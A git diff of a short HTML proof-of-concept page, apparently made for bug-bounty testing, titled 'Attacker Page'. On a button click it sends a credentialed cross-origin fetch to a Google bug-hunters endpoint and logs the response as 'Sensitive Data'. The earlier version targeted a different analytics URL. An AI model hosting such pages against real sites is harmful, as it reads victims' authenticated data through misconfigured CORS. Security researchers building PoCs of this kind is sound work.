@@ -3,30 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit Test</title>
+    <title>Attacker Page</title>
 </head>
 <body>
-    <h1>CORS Exploit Test</h1>
-    <button id="fetchData">Fetch Data</button>
-    <pre id="result"></pre>
+    <h1>Exploiting CORS</h1>
+    <button id="exploit">Exploit CORS</button>
+
     <script>
-        document.getElementById('fetchData').addEventListener('click', function() {
-            fetch('https://settings.luckyorange.com/9145dfbd', {
+        document.getElementById('exploit').addEventListener('click', function () {
+            fetch('https://bughunters.google.com/sensitive_endpoint', {
                 method: 'GET',
-                credentials: 'include' // Include cookies if necessary
+                credentials: 'include'
             })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok ' + response.statusText);
-                }
-                return response.json();
-            })
+            .then(response => response.text())
             .then(data => {
-                document.getElementById('result').innerText = JSON.stringify(data, null, 2);
+                console.log("Sensitive Data:", data);
+                alert('Exploit Successful! Check the console for sensitive data.');
             })
-            .catch(error => {
-                document.getElementById('result').innerText = 'Error: ' + error;
-            });
+            .catch(error => console.error('Error:', error));
         });
     </script>
 </body>
